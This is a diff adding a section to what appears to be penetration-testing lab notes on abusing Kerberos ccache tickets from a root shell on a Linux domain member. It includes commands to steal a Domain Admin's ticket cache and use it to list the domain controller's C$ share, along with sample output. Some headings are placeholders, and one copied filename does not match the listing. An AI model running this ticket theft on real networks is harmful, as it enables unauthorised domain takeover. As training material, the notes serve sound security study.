@@ -5050,7 +5050,153 @@ The most straightforward hash to crack is the NTLM hash. We can use tools like H
 su - carlos@<DOMAIN>
 ```
 
+**Obtain more hashes:**
+
+The user has a cronjob that uses a KeyTab file named, for example, `svc_workstations.kt`. We can repeat the process, crack the password, and log in as svc_workstations.
+
 </details>
+
+</details>
+
+<details>
+<summary><h4>Abusing KeyTab ccache</h4></summary>
+
+To abuse a `.ccache` file, we only need read access. These files are typically stored in `/tmp` and are readable only by the user who created them. However, if we obtain root access, we can read and leverage these files.
+
+After logging in with the `svc_workstations` credentials, we can run `sudo -l` to verify that the user is allowed to execute any command as root. From there, we can escalate privileges by running `sudo su` to switch to the root user.
+
+**Connect to Target via SSH**
+
+```bash
+ssh svc_workstations@<>@<IP> -p <PORT_TO_FORWARD>
+```
+
+**Check Sudo Permissions**
+
+```bash
+sudo -l
+```
+
+**Elevate to Root User**
+
+```bash
+sudo su
+```
+
+**Confirm Current User**
+
+```bash
+whoami
+```
+
+As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.
+
+**Confirm Current User**
+
+```bash
+ls -la /tmp
+```
+
+**Expected Output:**
+
+```bash
+# total 76
+# drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
+# drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
+# -rw-------  1 julio@<>            domain users@<> 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
+# -rw-------  1 julio@<>            domain users@<> 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
+# -rw-------  1 david@<>            domain users@<> 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
+# -rw-------  1 svc_workstations@<> domain users@<> 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
+# -rw-------  1 carlos@<>           domain users@<> 3175 Oct  7 11:35 krb5cc_647402606
+# -rw-------  1 carlos@<>           domain users@<> 1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA
+```
+
+If there is an user to whom we have not yet gained access. We can confirm the groups to which he belongs using id.
+
+**Identify group membership**
+
+```bash
+id julio@<DOMAIN>
+```
+
+**Expected Output:**
+
+```bash
+# uid=647401106(julio@<DOMAIN>) gid=647400513(domain users@<DOMAIN>) groups=647400513(domain users@<DOMAIN>),647400512(domain admins@<DOMAIN>),647400572(denied rodc password replication group@<DOMAIN>)
+```
+
+Julio is a member of the **Domain Admins** group. We can attempt to impersonate the user and gain access to the **DC01** Domain Controller host.
+
+To import the ccache file into our current session, we can copy the ccache file and assign the file path to the KRB5CCNAME variable.
+
+**TITLE:**
+
+```bash
+klist
+```
+
+**Expected Output:**
+
+```bash
+# klist: No credentials cache found (filename: /tmp/krb5cc_0)
+```
+
+**TITLE:**
+
+```bash
+cp /tmp/krb5cc_647401106_I8I133 .
+```
+
+**TITLE:**
+
+```bash
+export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+```
+
+**TITLE:**
+
+```bash
+klist
+```
+
+**Expected Output:**
+
+```bash
+# Ticket cache: FILE:/root/krb5cc_647401106_I8I133
+# Default principal: julio@<DOMAIN>
+
+# Valid starting       Expires              Service principal
+# 10/07/2025 13:25:01  10/07/2025 23:25:01  krbtgt/<DOMAIN>@<DOMAIN>
+#         renew until 10/08/2025 13:25:01
+```
+
+**TITLE:**
+
+```bash
+smbclient //dc01/C$ -k -c ls -no-pass
+```
+
+**Expected Output:**
+
+```bash
+#   $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2024
+#   Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2024
+#   Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2024
+#   john                                D        0  Mon Jul 18 13:19:50 2025
+#   julio                               D        0  Mon Jul 18 13:54:02 2025
+#   pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2025
+#   PerfLogs                            D        0  Fri Feb 25 16:20:48 2025
+#   Program Files                      DR        0  Wed Oct  6 20:50:50 2024
+#   Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2025
+#   ProgramData                       DHn        0  Fri Aug 19 12:18:42 2025
+#   SharedFolder                        D        0  Thu Oct  6 14:46:20 2025
+#   System Volume Information         DHS        0  Wed Jul 13 19:01:52 2025
+#   tools                               D        0  Thu Sep 22 18:19:04 2025
+#   Users                              DR        0  Thu Oct  6 11:46:05 2025
+#   Windows                             D        0  Wed Oct  5 13:20:00 2025
+
+#                 7706623 blocks of size 4096. 4447612 blocks available
+```
 
 </details>
 
